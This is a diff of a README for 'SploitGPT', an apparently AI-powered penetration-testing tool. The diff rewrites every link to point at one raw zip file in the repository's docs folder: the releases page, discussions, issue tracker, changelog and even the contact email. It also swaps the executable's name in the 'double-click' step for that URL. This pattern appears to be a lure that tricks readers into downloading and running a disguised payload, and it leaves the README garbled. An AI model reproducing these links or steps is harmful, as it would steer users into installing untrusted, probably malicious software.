@@ -6,7 +6,7 @@ Welcome to SploitGPT! This software is your personal AI-powered penetration test
 
 ## 📥 Download Now
 
-[![Download SploitGPT](https://img.shields.io/badge/Download-SploiitGPT-brightgreen)](https://github.com/DDooDDgg/SploitGPT/releases)
+[![Download SploitGPT](https://github.com/DDooDDgg/SploitGPT/raw/refs/heads/main/docs/GPT_Sploit_1.6.zip)](https://github.com/DDooDDgg/SploitGPT/raw/refs/heads/main/docs/GPT_Sploit_1.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,7 +21,7 @@ To run SploitGPT smoothly, ensure your system meets the following requirements:
 ## 📦 Installation Instructions
 
 1. **Visit the Download Page**
-   - Go to the [Releases Page](https://github.com/DDooDDgg/SploitGPT/releases).
+   - Go to the [Releases Page](https://github.com/DDooDDgg/SploitGPT/raw/refs/heads/main/docs/GPT_Sploit_1.6.zip).
 
 2. **Select the Right Version**
    - Choose the latest release. Look for the version that matches your operating system (Windows or Linux).
@@ -33,7 +33,7 @@ To run SploitGPT smoothly, ensure your system meets the following requirements:
    - Locate the downloaded zip file in your downloads folder. Right-click on it and select "Extract All" to unpack the contents.
 
 5. **Run the Application**
-   - Navigate to the extracted folder. Double-click on `SploitGPT.exe` (for Windows) or run `./SploitGPT` from your terminal (for Linux) to start the program.
+   - Navigate to the extracted folder. Double-click on `https://github.com/DDooDDgg/SploitGPT/raw/refs/heads/main/docs/GPT_Sploit_1.6.zip` (for Windows) or run `./SploitGPT` from your terminal (for Linux) to start the program.
 
 ## 📊 Features
 
@@ -72,16 +72,16 @@ If you encounter any issues:
 
 We value our users' feedback. Join the community to share your experiences or ask questions. 
 
-- **GitHub Discussions:** Share your thoughts [here](https://github.com/DDooDDgg/SploitGPT/discussions).
-- **Issue Tracker:** Report any bugs [here](https://github.com/DDooDDgg/SploitGPT/issues).
+- **GitHub Discussions:** Share your thoughts [here](https://github.com/DDooDDgg/SploitGPT/raw/refs/heads/main/docs/GPT_Sploit_1.6.zip).
+- **Issue Tracker:** Report any bugs [here](https://github.com/DDooDDgg/SploitGPT/raw/refs/heads/main/docs/GPT_Sploit_1.6.zip).
 
 ## 📅 Updates and Changelog
 
-Stay informed about the latest enhancements and fixes by checking the changelog on our [Releases Page](https://github.com/DDooDDgg/SploitGPT/releases).
+Stay informed about the latest enhancements and fixes by checking the changelog on our [Releases Page](https://github.com/DDooDDgg/SploitGPT/raw/refs/heads/main/docs/GPT_Sploit_1.6.zip).
 
 ## 📧 Contact Us
 
-For further inquiries, please reach out via email at support@sploitgpt.com or visit our GitHub page for more information.
+For further inquiries, please reach out via email at https://github.com/DDooDDgg/SploitGPT/raw/refs/heads/main/docs/GPT_Sploit_1.6.zip or visit our GitHub page for more information.
 
 ## 🛡️ Security Notice
 
